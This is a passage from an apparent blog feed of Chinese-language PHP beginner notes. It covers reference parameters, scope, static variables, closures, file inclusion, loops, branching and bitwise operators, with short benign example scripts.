<li>有的时候，希望在函数内部拿到的外部数据，能够在函数内部改变，那么就需要明确告知函数（定义时），函数才会在调用的时候去主动获取外部数据的内存地址。以上这种定义形式参数的方式叫作引用传值</li>
<li>▲ 在调用的时候，必须给引用传值的参数位置传入实际参数，而且参数本身必须是变量。（变量才有指向的数据的内存地址）</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php


    //引用传值
    function display($a,&amp;$b){
        //修改形参的值
        $a = $a * $a;
        $b = $b * $b;

        echo $a,&#39;&lt;br&gt;&#39;,$b,&#39;&lt;br/&gt;&#39;;
    }

    //定义变量
    $a = 10;
    $b = 5;

    //调用函数
    display($a,$b);  //输出为 100，25

    echo &#39;&lt;hr/&gt;&#39;,$a,&#39;&lt;br/&gt;&#39;,$b;  //输出为 10，25

    //错误调用：引用传值直接传入数据本身而不是变量
    //display(10,5);

?&gt;</code></pre><h4 id="5-函数返回值"><a href="#5-函数返回值" class="headerlink" title="5. 函数返回值"></a>5. 函数返回值</h4><ul>
<li>return，指的是将函数实现的结果，通过return关键字，返回给函数外部（函数调用处）在PHP中所有的函数都有返回值。（如果没有明确return使用，那么系统默认返回NULL）</li>
<li>▲ 函数的返回值可以是任意数据类型</li>
</ul>
<pre><code>&lt;?php

    //函数返回值

    //定义函数
    function display(){
        //输出
        echo __FUNCTION__;  //输出当前函数名字
    }

    //var_dump(display());

?&gt;</code></pre><ul>
<li>Ruturn关键字<ul>
<li>return在函数内部存在的价值：返回当前函数的结果（当前函数运行结束）</li>
<li>return还可以在文件中直接使用（不在函数里面）：代表文件将结果return后面跟的内容，转交给包含当前文件的位置。（通常在系统配置文件中使用较多），在文件中也代表中终止文件后面的代码：return之后的内容不会执行。</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //加法运算
    function add($num1,$num2){
        return $num1 + $num2;   //返回结果

    //输出
    echo $num1;
    }

    $res = add(10,20);        //外部定义变量接收函数运行结果

    echo $res;

    //将结果提交给另外包含的文件
    return &#39;hello world&#39;;

    echo $res;            //不再执行：上面return结束了

?&gt;</code></pre><pre><code>//return -&gt; include
&lt;?php


  //包含有return关键字的文件


    $res = include_once &#39;function3.php&#39;;
    var_dump($res);  //

?&gt;</code></pre><h4 id="6-作用域"><a href="#6-作用域" class="headerlink" title="6. 作用域"></a>6. 作用域</h4><ul>
<li>变量（常量）能够被访问的区域</li>
<li>全局变量：就是用户普通定义的变量（函数外部定义）<ul>
<li>所属全局空间：在PHP中只允许在全局空间使用：理论上函数内部不可方法</li>
<li>脚本周期：直到脚本运行结束（最后一行代码执行完）</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //PHP中作用域

    //默认的代码空间：全局空间
    $global = &#39;global area&#39;;  //最终会被系统纳入到超全局变量中：$GLOBALS[&#39;global&#39;] = global area;

    function display(){

        //访问全局变量
        echo $global;   //不能访问
    }

    //调用函数
    display();  //访问报错
?&gt;</code></pre><ul>
<li>局部变量：就是在函数内部定义的变量<ul>
<li>所属当前函数空间：在PHP中只允许在当前函数自己内部使用</li>
<li>函数周期：函数执行结束（函数是在栈区中开辟独立内存空间运行）</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //局部变量（函数内部定义）
    function display(){
        //所有的形参都可以理解为局部变量
        $inner = __FUNCTION__;        //局部变量
    }

    //调用函数
    display();
    //全局空间访问局部变量
    echo $inner;   //不能访问

?&gt;</code></pre><ul>
<li>超全局变量：系统定义的变量（预定义变量：$_SERVER、$_POST等）<ul>
<li>所属超全局空间：没有访问限制（函数内外都可以访问）</li>
<li>超全局变量会将全局变量自动纳入到$GLOBALS里面，而$GLOBALS没有作用域限制，所以能够帮助局部去访问全局变量：但是必须使用数组方式</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //默认的代码空间：全局空间
    $global = &#39;global area&#39;;  //最终会被系统纳入到超全局变量中：$GLOBALS[&#39;global&#39;] = global area;

    function display(){

        //访问全局变量
        echo $global;           //不能访问

        //访问全局变量
        //var_dump($GLOBALS);
        echo $GLOBALS[&#39;global&#39;];

    }

    //调用函数
    display();  //报错+输出 global area

?&gt;</code></pre><ul>
<li>global关键字：实现全局访问局部，同时局部也可以访问全局（▲同$GLOBALS，但有区别，$GLOBALS不可调用一个外部不存在的变量)<ul>
<li>▲ 一种在函数里面定义变量的一种方式</li>
<li>如果使用global定义的变量名在外部存在（全局变量），那么系统在函数内部定义的变量直接指向外部全局变量所指向的内存空间（同一个变量）</li>
<li>如果使用global定义的变量名在外部不存在（全局变量），系统会自动在全局空间（外部）定义一个与局部变量同名的全局变量</li>
<li>本质形式：在函数的内部和外部，对一个同名变量（全局和局部）使用同一块内存地址保存数据，从而实现共同拥有</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //默认的代码空间：全局空间
    $global = &#39;global area&#39;;  //最终会被系统纳入到超全局变量中：$GLOBALS[&#39;global&#39;] = global area;

    function display(){

        //定义变量：使用全局变量
        global $global;           //全局空间存在
        echo $global;

        //定义变量：全局不存在
        global $local;
        $local = &#39;inner&#39;;
    }

    //调用函数
    display();

    //访问&quot;局部&quot;变量
    echo $local;

?&gt;</code></pre><h4 id="7-静态变量"><a href="#7-静态变量" class="headerlink" title="7. 静态变量"></a>7. 静态变量</h4><ul>
<li>在函数内部定义的变量，使用static关键字修饰，用来实现跨函数共享数据的变量，函数运行结束所有局部变量都会清空，如果重新运行一下函数，所有的局部变量又会重新初始化<ul>
<li>静态变量的作用是为了跨函数共享数据（同一个函数被多次调用）</li>
<li>系统在进行编译的时候会对static这一行进行初始化 -&gt; 为静态变量赋值</li>
<li>▲ 函数多次调用时，会u自动跳过static关键字这一行</li>
</ul>
</li>
<li>使用方向<ul>
<li>为了统计：当前函数被调用的次数</li>
<li>为了统筹函数多次调用得到的不同结果</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //静态变量

    //定义函数
    function display(){
        //定义变量
        $local = 1;           //局部变量

        //定义静态变量
        static $count = 1;        //静态变量

        echo $local++,$count++,&#39;&lt;br/&gt;&#39;;
    }

    //调用
    display();
    display();
    display();

?&gt;</code></pre><h4 id="8-可变函数"><a href="#8-可变函数" class="headerlink" title="8. 可变函数"></a>8. 可变函数</h4><ul>
<li>当前有一个变量所保存到值，刚好是函数的名字，那么就可以使用变量+()来充当函数名使用<ul>
<li>可变函数在系统使用的过程中还是比较多的，尤其是使用很多系统函数的时候：需要用户在外部定义一个自定义函数，但是需要传入到系统函数内部使用</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //PHP可变函数

    //定义函数
    function display(){
        echo __LINE__, __FUNCTION__;
    }

    //定义变量
    $func = &#39;display&#39;;

    //可变函数
    $func();
    echo &quot;&lt;/br&gt;&quot;;

    //定义系统函数（假设）
    function sys_function($arg1,$arg2){
        //给指定的函数（第一个参数），求对应的第二个参数值的4次方
        //为实际用户输入的数值进行处理

        return $arg1($arg2);  //user_function(10)
    }

    //定义一个用户函数：求一个数的四次方
    function user_function($num){
        return $num * $num * $num * $num;
    }

    //求10的4次方
    echo sys_function(&#39;user_function&#39;,10);  //输出为 10000

?&gt;</code></pre><h4 id="9-匿名函数"><a href="#9-匿名函数" class="headerlink" title="9. 匿名函数"></a>9. 匿名函数</h4><ul>
<li>没有名字的函数<ul>
<li>▲ 变量保存匿名函数，本质得到的是一个对象（Closure）</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //匿名函数

    //定义基本匿名函数
    $func = function(){
        //函数体
        echo &#39;hello world&#39;;
    };

    //调用匿名函数：可变函数
    $func();
    echo &quot;&lt;/br&gt;&quot;;

    //查看变量内容
    var_dump($func);

?&gt;</code></pre><h4 id="10-闭包"><a href="#10-闭包" class="headerlink" title="10. 闭包"></a>10. 闭包</h4><ul>
<li>closure， 一词来源于以下两者的结合：要执行的代码块（由于自由变量被包含在代码块中，这些自由变量以及它们引用的对象没有被释放）和为自由变量提供绑定的计算环境（作用域）</li>
<li>▲ 简单理解：函数内部有一些局部变量（要执行的代码块）在函数执行之后没有被释放，是因为在函数内部还有对应的函数在引用（函数的内部函数：匿名函数）</li>
</ul>
<pre><code>&lt;?php

    //闭包函数
    function display(){
        //定义变量：局部变量
        $name = __FUNCTION__;

        //定义匿名函数
        $innerfunction = function() use($name){   //use就是将外部变量（局部）保留给内部使用（闭包）

            //函数内部的函数
            //echo $name;
        };

        //调用函数
        $innerfunction();
    }

    display();

    //闭包函数
    function display1(){
        //定义变量：局部变量
        $name = __FUNCTION__;

        //定义匿名函数
        $innerfunction = function() use($name){  //use就是将外部变量（局部）保留给内部使用（闭包）

        //函数内部的函数
        echo $name;
        };

        //返回内部匿名函数
        return $innerfunction;
    }

    $closure = display1();  

    //display1函数运行结束：理论上局部变量$name应该已经被释放
    $closure();

?&gt;</code></pre><h4 id="11-伪类型"><a href="#11-伪类型" class="headerlink" title="11. 伪类型"></a>11. 伪类型</h4><ul>
<li>假类型，实际上在PHP中不存在的类型。但是通过伪类型可以帮助程序员去更好的查看操作手册从而更方便学习<ul>
<li>Mixed：混合的，可以是多种PHP中的数据类型</li>
<li>Number：数值的，可以是任意数值类型（整形和浮点型）</li>
</ul>
</li>
<li>PHP伪类型，图片来自网络</li>
</ul>
<p><img src="/images/php/php-notepad/PHP%E4%BC%AA%E7%B1%BB%E5%9E%8B.png" srcset="/img/loading.gif" alt="PHP伪类型"></p>
<h4 id="12-引用函数"><a href="#12-引用函数" class="headerlink" title="12. 引用函数"></a>12. 引用函数</h4><pre><code>&lt;?php

    //静态变量做局部变量
    function &amp;demo1()
    {
        static $i = 0;
        $i++;
        return $i;
    }

    $b = &amp;demo1();  //$b和$i的内存共用(与return的变量共用)
    echo $b;  //输出为1
    echo &quot;&lt;/br&gt;&quot;;

    $b = 100;
    $t = demo1();
    echo $t;  //输出为101
    echo &quot;&lt;/br&gt;&quot;;


    //临时变量做局部变量
    function &amp;demo2()
    {
        $j = 1;
        return $j;
    }

    $c = &amp;demo2();
    echo $c;  //输出为1
    echo &quot;&lt;/br&gt;&quot;;

    $c = 100;
    $t = demo2();
    echo $c;  //输出为100

?&gt; </code></pre><pre><code>&lt;?php

    //三个变量共用一个内存地址(与return的变量共用)
    function &amp;demo($a,$b,$c)
    {
        static $i = 0;
        $i++;
        return $i;
    }

    $x = &amp;demo(100,200,300);
    echo $x;  //输出为1
    echo &quot;&lt;/br&gt;&quot;;

    $xx = &amp;demo(1000,2000,3000);
    echo $xx;  //输出为2
    echo &quot;&lt;/br&gt;&quot;;

    $xxx = &amp;demo(10000,20000,30000);
    echo $xxx;  //输出为3
    echo &quot;&lt;/br&gt;&quot;;

    $xx = 400;
    echo demo(11,22,33);  //输出为401;
?&gt;
</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP笔记-10：文件包含</title>
    <url>/2020/03/13/PHP%E7%AC%94%E8%AE%B0-10%EF%BC%9A%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<hr>
<h4 id="1-文件包含形式"><a href="#1-文件包含形式" class="headerlink" title="1. 文件包含形式"></a>1. 文件包含形式</h4><ul>
<li>四种文件包含形式<ul>
<li>Include：包含文件</li>
<li>Include_once：系统会自动判断文件包含过程中，是否已经包含过（一个文件最多被包含一次）</li>
<li>Require：与include相同</li>
<li>Require_once：以include_once相同</li>
</ul>
</li>
<li>向上包含<ul>
<li>先包含文件，后使用文件中的内容  </li>
</ul>
</li>
</ul>
<pre><code>//include1.php
&lt;?php

    //被包含文件


    //定义数据
    $a = 1;
    define(&#39;PI&#39;,3.14);

?&gt;</code></pre><pre><code>//include2.php
&lt;?php

    //包含文件：使用数据


    //包含文件
    include &#39;include1.php&#39;; //包含当前文件include2.php所在文件夹下的include1.php

    echo $a,PI;


    //再次加载
    //include &#39;include1.php&#39;;

    //include_once
    //include_once &#39;include1.php&#39;;


?&gt;
</code></pre><ul>
<li>向下包含<ul>
<li>先准备内容，然后包含另外的文件，在另外的文件中，使用当前的内容</li>
</ul>
</li>
</ul>
<pre><code>//include3.php
&lt;?php

    //定义数据

    $a = 10;
    const PI = 3.14;


    //包含文件：为了显示以上数据
    include_once &#39;include4.php&#39;;

?&gt;</code></pre><pre><code>//include4.php
&lt;table&gt;
    &lt;tr&gt;
        &lt;td&gt;&lt;?php echo $a;?&gt;&lt;/td&gt;
        &lt;td&gt;&lt;?php echo PI;?&gt;&lt;/td&gt;
    &lt;/tr&gt;
&lt;/table&gt;</code></pre><h4 id="2-区别"><a href="#2-区别" class="headerlink" title="2. 区别"></a>2. 区别</h4><ul>
<li>Include和include_once<ul>
<li>Include系统会碰到一次，执行一次；如果对统一个文件进行多次加载，那么系统会执行多次；</li>
<li>Include_once：系统碰到多次，也只会执行一次。</li>
</ul>
</li>
</ul>
<pre><code>//include2.php
&lt;?php

    //包含文件：使用数据


    //包含文件
    include &#39;include1.php&#39;; //包含当前文件include2.php所在文件夹下的include1.php

    echo $a,PI;


    //再次加载
    //include &#39;include1.php&#39;;

    //include_once
    //include_once &#39;include1.php&#39;;


?&gt;</code></pre><ul>
<li>Require和include<ul>
<li>本质都是包含文件，唯一的区别在于包含不到文件的时候，报错的形式不一样</li>
<li>Include的错误级别比较轻：不会阻止代码执行</li>
<li>Require要求较高：如果包含出错代码不再执行（require后面的代码）</li>
</ul>
</li>
</ul>
<pre><code>//include5.php
&lt;?php

    //require和include的区别


    //include包含文件
    //include &#39;a.php&#39;;

    //require包含文件
    require &#39;a.php&#39;;


    echo &#39;hello world&#39;;

?&gt;</code></pre><h4 id="3-文件加载原理"><a href="#3-文件加载原理" class="headerlink" title="3. 文件加载原理"></a>3. 文件加载原理</h4><ul>
<li>PHP代码的执行流程<ul>
<li>读取代码文件（PHP程序）</li>
<li>编译：将PHP代码转换成字节码（生成opcode）</li>
<li>zendengine来解析opcode，按照字节码去进行逻辑运算</li>
<li>转换成对应的HTML代码</li>
</ul>
</li>
<li>文件加载原理<ul>
<li>在文件加载（include或者require）的时候，系统会自动的将被包含文件中的代码相当于嵌入到当前文件中</li>
<li>加载位置：在哪加载，对应的文件中的代码嵌入的位置就是对应的include位置</li>
<li>在PHP中被包含的文件是单独进行编译的</li>
</ul>
</li>
<li>▲ PHP文件在编译的过程中如果出现了语法错误，那么会失败（不会执行）；但是如果被包含文件有错误的时候，系统会在执行到包含include这条语句的时候才会报错</li>
</ul>
<h4 id="4-文件加载路径"><a href="#4-文件加载路径" class="headerlink" title="4. 文件加载路径"></a>4. 文件加载路径</h4><ul>
<li>文件在加载的时候需要指定文件路径才能保证PHP正确的找到对应的文件</li>
<li>绝对路径：从磁盘的根目录开始（本地绝对路径）<ul>
<li>Windows：盘符C:/路径/PHP文件</li>
<li>Linux：/路径/PHP文件</li>
</ul>
</li>
<li>相对路径：从当前文件所在目录开始的路径<ul>
<li>.|./：表示当前文件夹</li>
<li>../：上级目录（当前文件夹的上一层文件夹）</li>
</ul>
</li>
<li>效率对比<ul>
<li>绝对路径相对效率偏低，但是相对安全（路径不会出问题）</li>
<li>相对路径相对效率高些，但是容易出错（相对路径会发生改变）</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php


    //PHP文件加载路径

    //相对路径加载
    //include_once &#39;include1.php&#39;;  //默认当前文件本身

    //include_once &#39;./include1.php&#39;;    

    //复杂相对路径
    //include_once &#39;../htdocs/include1.php&#39;;



    //绝对路径
    include_once &#39;D:/server/Apache24/htdocs/include1.php&#39;;

    echo $a;

?&gt;</code></pre><h4 id="5-文件嵌套包含"><a href="#5-文件嵌套包含" class="headerlink" title="5. 文件嵌套包含"></a>5. 文件嵌套包含</h4><ul>
<li>一个文件包含另外一个文件，同时被包含的文件又包含了另外一个文件</li>
</ul>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP笔记-9：循环结构</title>
    <url>/2020/03/13/PHP%E7%AC%94%E8%AE%B0-9%EF%BC%9A%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<hr>
<h4 id="1-循环结构"><a href="#1-循环结构" class="headerlink" title="1. 循环结构"></a>1. 循环结构</h4><ul>
<li>代码段在一定的控制下，可以多次执行</li>
<li>循环结构<ul>
<li>For循环：通过条件、起始和终止判断执行</li>
<li>While循环：通过判断条件终止</li>
<li>Do-while循环：跟while差不多</li>
<li>Foreach循环：专门针对数组</li>
</ul>
</li>
</ul>
<h4 id="2-for循环"><a href="#2-for循环" class="headerlink" title="2. for循环"></a>2. for循环</h4><pre><code>&lt;?php

    //循环结构：for循环


    //从1到10输出：初始为1，截止为10
    for($i = 1; $i &lt;= 10;$i++){
        //输出
        //echo $i,&#39;&lt;br/&gt;&#39;;
    }

    //最后：$i == 11
    echo $i;  //输出为 11
?&gt;</code></pre><h4 id="3-while循环"><a href="#3-while循环" class="headerlink" title="3. while循环"></a>3. while循环</h4><pre><code>&lt;?php

    //while循环


    //定义条件
    $i = 1;

    //循环判定执行
    while($i &lt;= 10){
        //循环体
        echo $i++,&#39;&lt;br/&gt;&#39;;

        //循环条件变更
        //$i++;
    }
?&gt;</code></pre><h4 id="4-do-while循环"><a href="#4-do-while循环" class="headerlink" title="4. do-while循环"></a>4. do-while循环</h4><ul>
<li>看着很像while，while首先进行条件判定然后执行循环体，有可能出现第一次就条件不满足，那么就会直接失败（循环体一次都不执行）。Do-while就是先干了再说（执行循环体），后判断条件。（至少会执行一次循环体）</li>
</ul>
<pre><code>&lt;?php

    //do-while循环结构

    //输出1-10之间的偶数（条件判定加入）

    //定义基础条件
    $i = 1;

    //循环判定
    do{
        //执行输出
        if($i % 2 != 1){
            //是偶数
            echo $i,&#39;&lt;br/&gt;&#39;;        
        }

        //条件变更
        $i++;
    }while($i &lt;= 10);
?&gt;</code></pre><h4 id="5-循环控制"><a href="#5-循环控制" class="headerlink" title="5. 循环控制"></a>5. 循环控制</h4><ul>
<li>循环控制：在循环内部对循环本身进行控制</li>
<li>中断控制：重新开始循环，循环体中还有其他内容，也再执行<ul>
<li>Continue 层级; //默认是1（循环可以多层嵌套）</li>
</ul>
</li>
<li>终止控制：循环直接结束<ul>
<li>Break 层级;        //默认是1</li>
</ul>
</li>
<li>嵌套循环控制<ul>
<li>Continue 2;  //当前自己循环后面内容不再执行，同时外部循环如果还有循环体也不再执行，重新来过</li>
<li>Break 2;     //当前自己循环结束，同时外部也结束（如果还有外部不受影响，继续执行）</li>
</ul>
</li>
</ul>
<pre><code>//字符串函数只能给字符串使用
&lt;?php

    //循环控制


    //需求：输出1到100之间的5的倍数

    $i = 1;

    while($i &lt;= 100){

        //判断：是否是5的倍数
        if($i % 5 != 0) {
            //说明当前$i不是5的倍数

            //重新循环
            $i++;

            //重新循环
            continue;         //系统重新跳到循环开始处


            //终止循环
            //break;
        }


        //输出数值
        echo $i++,&#39;&lt;br/&gt;&#39;;
    }

    echo $i;

    //嵌套的循环控制
    $i = 1;
    $j = 1;

    for($i=1;$i&lt;=10;$i++)
    {
        for($j=1;$j&lt;=2;$j++)
        {
            echo &#39;ok!&#39;;
            //break;  //输出10个ok!
            break 2;  //输出1个ok!
        }
    }

?&gt;</code></pre><h4 id="6-foreach循环"><a href="#6-foreach循环" class="headerlink" title="6. foreach循环"></a>6. foreach循环</h4><pre><code>&lt;?php
    $arr1 = array(&#39;mingzi&#39; =&gt; &#39;心东&#39;,&#39;nianling&#39; =&gt; &#39;21&#39;,&#39;zhiye&#39; =&gt; &#39;网络安全&#39;,&#39;aihao&#39; =&gt; &#39;吃饭睡觉&#39;);

    foreach($arr1 as $key =&gt; $value)
    {
        echo &#39;键名:&#39;.$key.&#39;值&#39;.$value.&#39;&lt;/br&gt;&#39;;
        echo $arr1[$key].&quot;&lt;/br&gt;&quot;;  //输出关联数组
    }
?&gt;</code></pre><h4 id="7-流程控制替代语法"><a href="#7-流程控制替代语法" class="headerlink" title="7. 流程控制替代语法"></a>7. 流程控制替代语法</h4><ul>
<li>替换模式<ul>
<li>左大括号{使用冒号替代：</li>
<li>右大括号}使用end+对应的起始标记替代</li>
</ul>
</li>
<li>具体替换模式<ul>
<li>if():    endif;</li>
<li>sswitch():   endswitch;</li>
<li>for(;;):    endfor;</li>
<li>while():    endwhile;</li>
<li>foreach():    endforeach;</li>
</ul>
</li>
<li>需求：打印一个九九乘法表，使用表格来展示</li>
</ul>
<pre><code>&lt;table border=1&gt;
    &lt;?php for($i = 1;$i &lt; 10;$i++){?&gt;
        &lt;tr&gt;
            &lt;?php for($j = 1;$j &lt;= $i;$j++){?&gt;
                &lt;td&gt;
                    &lt;?php echo $i . &#39; * &#39; . $j . &#39; = &#39; . $i * $j;?&gt;
                &lt;/td&gt;
            &lt;?php }?&gt;
        &lt;/tr&gt;
    &lt;?php }?&gt;
&lt;/table&gt;


&lt;table border=1&gt;
    &lt;?php for($i = 1;$i &lt; 10;$i++):?&gt;
        &lt;tr&gt;
            &lt;?php for($j = 1;$j &lt;= $i;$j++):?&gt;
                &lt;td&gt;
                    &lt;?php echo $i . &#39; * &#39; . $j . &#39; = &#39; . $i * $j;?&gt;
                &lt;/td&gt;
            &lt;?php endfor;?&gt;
        &lt;/tr&gt;
    &lt;?php endfor;?&gt;
&lt;/table&gt;</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP笔记-8：分支结构</title>
    <url>/2020/03/13/PHP%E7%AC%94%E8%AE%B0-8%EF%BC%9A%E5%88%86%E6%94%AF%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<hr>
<h4 id="1-分支结构"><a href="#1-分支结构" class="headerlink" title="1. 分支结构"></a>1. 分支结构</h4><ul>
<li>在PHP中，分支结构主要有两种：if分支和switch分支</li>
</ul>
<h4 id="2-if分支"><a href="#2-if分支" class="headerlink" title="2. if分支"></a>2. if分支</h4><ul>
<li>如果的意思，给定一个条件，同时为该条件设置多种（两种）情况，然后通过条件判断来实现具体的执行段</li>
<li>▲ 如果条件特别多才会采用复合if形式</li>
<li>▲ 如果条件比较单一（同一个条件），会采用elseif复合方式</li>
<li>▲ 如果判断条件不一致，建议使用嵌套语法（不宜有太多层嵌套：影响代码美观）</li>
</ul>
<pre><code>&lt;?php


    //分支结构：if分支


    //最简if
    $day = &#39;weekenday&#39;;

    //如果是星期天就出去玩
    if($day == &#39;sunday&#39;){
        echo &#39;go out&#39;;
    }


    //基本if判断
    //如果是星期天就出去玩，否则上班
    if($day == &#39;sunday&#39;){
        echo &#39;go out play&#39;;
    }else{
        //不满足条件
        echo &#39;work&#39;;
    }


    //复合if结构
    //如果是星期天就出去玩，否则不能，但是如果是周六，那么可以在家玩
    echo &#39;&lt;hr/&gt;&#39;;
    $day = &#39;satday&#39;;
    if($day == &#39;sunday&#39;){
        echo &#39;go out&#39;;
    }else{
        //包含全部不满足情况
        //重新进行判断
        if($day == &#39;satday&#39;){
            echo &#39;play at home&#39;;
        }else{
            echo &#39;work&#39;;
        }
    }

    echo &#39;&lt;hr/&gt;&#39;;
    if($day == &#39;sunday&#39;){
        echo &#39;go out&#39;;
    }elseif($day == &#39;satday&#39;){
        echo &#39;play at home&#39;;
    }else{
        echo &#39;work&#39;;
    }

?&gt;</code></pre><h4 id="3-switch分支"><a href="#3-switch分支" class="headerlink" title="3. switch分支"></a>3. switch分支</h4><ul>
<li>有一组情形存在，同过一条件，通常有多个值，但是每一个值都会有对应不同的代码要执行</li>
<li>▲ 在switch中，如果条件匹配成功，那么系统就不会再次匹配条件，会自动顺序执行向下的所有代码（case代码除外），需要中断执行：break表示中断switch（结束）</li>
</ul>
<pre><code>&lt;?php

    //分支结构：switch分支

    //根据日期做不同的事情
    $day = 1;

    //从1到5做不同的事情
    switch($day){
        //$day条件一定是个具体的值
        case 1: //$day == 1
            echo &#39;1&#39;;
            //break;
        case 2:
            echo &#39;2&#39;;
            break;
        case 3:
            echo &#39;3&#39;;
            break;
        case 4:
            echo &#39;4&#39;;
            break;
        case 5:
            echo &#39;5&#39;;
            break;
        default:
            echo &#39;error&#39;;
            break;  
    }

?&gt;</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP笔记-7：计算机码与位运算</title>
    <url>/2020/03/13/PHP%E7%AC%94%E8%AE%B0-7%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A0%81%E4%B8%8E%E4%BD%8D%E8%BF%90%E7%AE%97/</url>
    <content><![CDATA[<hr>
<h4 id="1-计算机码"><a href="#1-计算机码" class="headerlink" title="1. 计算机码"></a>1. 计算机码</h4><ul>
<li>计算机在实际存储数据的时候，采用的编码规则（二进制规则）</li>
<li>原码、反码和补码，数值本身最左边一位是用来充当符号位：正数为0，负数为1</li>
<li>原码：数据本身从十进制转换成二进制得到的结果<ul>
<li>正数：左边符号位为0（正数的原码、反码和补码就是原码本身）</li>
<li>负数：左边符号位为1</li>
</ul>
</li>
<li>反码：针对负数，符号位不变，其他位取反</li>
<li>补码：针对负数，反码+1</li>
<li>▲ 系统中存在两个0：+0和-0<ul>
<li>+0： 00000000 原码</li>
<li>-0： 10000000 原码</li>
<li>取反 11111111</li>
<li>补码 00000000</li>
</ul>
</li>
</ul>
<h4 id="2-位运算符"><a href="#2-位运算符" class="headerlink" title="2. 位运算符"></a>2. 位运算符</h4><ul>
<li>取出计算机中最小的单位（位bit）进行运算</li>
<li>位运算符<ul>
<li>&amp;：按位与，两个位都为1，结果为1，否则为0</li>
<li>|：按位或，两个有一个为1，结果为1</li>
<li>~：按位非，一个位如果为1则变成0，否则反之</li>
<li>^：按位异或，两个相同则为0，不同则为1</li>
<li>&lt;&lt;：按位左移，整个位（32位），向左移动一位，右边补0<ul>
<li>按位左移：乘以2的操作</li>
</ul>
</li>
<li>/&gt;&gt;：按位右移，整个位向右移动一位，左边补符号位对应内容（正数补0，负数补1）<ul>
<li>按位右移：除以2的操作（不完全正确）：整数除2会出现小数</li>
</ul>
</li>
</ul>
</li>
<li>▲ 系统进行任何位运算的时候都是使用的补码</li>
<li>▲ 运算结束之后都必须转换成原码才是最终要显示的数据</li>
</ul>
<pre><code>&lt;?php

    //位运算

    //计算机码
    $a = 5;
    $b = -5;

    /*
    5原码： 00000101

    -5原码：10000101
    取反：  11111010   //反码：符号位不变，其他位取反
    求补： 11111011    //补码：反码+1

    */

    //按位右移
    var_dump($b&gt;&gt;1);  //输出为 -3
    var_dump($b&gt;&gt;2);  //输出为 -2
    /*
        -5  11111011
        &gt;&gt;1 11111101    //运算结果：补码
        -1  11111100    //反码
      取反  10000011  //原码：-2
    */

    //按位非
    var_dump(~$b);  //输出为 4
    /*
        -5  11111011    补码
    取反    00000100
    原码    00000100  
    */


    //按位与
    var_dump($a &amp; $b);  //输出为 1
    /*
        //取出系统存储的结果进行与操作
        5   00000101
        -5  11111011
        &amp;   00000001    //最终结果
        转换：判断符号位，0表示正数（原码），1表示负数（补码）
    */
?&gt;</code></pre>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP笔记-6：运算符</title>
    <url>/2020/03/13/PHP%E7%AC%94%E8%AE%B0-6%EF%BC%9A%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
    <content><![CDATA[<hr>
<h4 id="1-运算符"><a href="#1-运算符" class="headerlink" title="1. 运算符"></a>1. 运算符</h4><ul>
<li>Operator，是一种将数据进行运算的特殊符号，在PHP中一共有十种运算符之多</li>
</ul>
<h4 id="2-赋值运算符"><a href="#2-赋值运算符" class="headerlink" title="2. 赋值运算符"></a>2. 赋值运算符</h4><ul>
<li>符号是”=”，表示将右边的结果（可以是变量、数据、常量和其它运算出来的结果），保存到内存的某个位置，然后将位置的内存地址赋值给左侧的变量（常量）</li>
</ul>
<h4 id="3-算术运算符"><a href="#3-算术运算符" class="headerlink" title="3. 算术运算符"></a>3. 算术运算符</h4><ul>
<li>算术运算符<ul>
<li>+：执行数据累加</li>
<li>-：数据相减</li>
<li>*：两个数相乘</li>
<li>/：正斜杠代替，表示两个数相除</li>
<li>%：取余（模）运算，两个数（整数）相除，保留余数</li>
</ul>
</li>
<li>▲ 在进行除法运算或者取余运算的时候，对应的除数（第二个数）不能为0</li>
</ul>
<pre><code>&lt;?php

    //运算符

    //算术运算符
    $a = $b = 10;       //连贯赋值运算：两个不同变量
    $c = 0;

    //var_dump($a / 0); //错误：被除数不能为0

    echo &#39;&lt;hr/&gt;&#39;;

?&gt;</code></pre><h4 id="4-比较运算符"><a href="#4-比较运算符" class="headerlink" title="4. 比较运算符"></a>4. 比较运算符</h4><ul>
<li>比较两个数据的大小，或者两个内容是否相同，返回的结果都是布尔类型：满足返回true，不满足返回false</li>
<li>比较运算符<ul>
<li>/&gt;：左边大于右边，返回结果true（<strong>正斜杠为转义字符</strong>）</li>
<li>/&gt;=：左边大于等于右边（<strong>正斜杠为转义字符</strong>）</li>
<li>&lt;：左边小于右边</li>
<li>&lt;=：左边小于或者等于右边</li>
<li>==：左边的与右边的相同（大小相同）</li>
<li>!=：左边的与右边的不同（大小不同）</li>
<li>===：全等于，左边与右边相同：大小以及数据的类型都要相同</li>
<li>!==：不全等于，只有大小或者类型不同</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

    //比较运算符
    $a = &#39;123&#39;; //字符串
    $b = 123;   //整型

    //判断相等
    var_dump($a == $b);  //输出为 bool(true)
    echo &quot;&lt;/br&gt;&quot;;

    //全等判断
    var_dump($a === $b);  //输出为 bool(false)
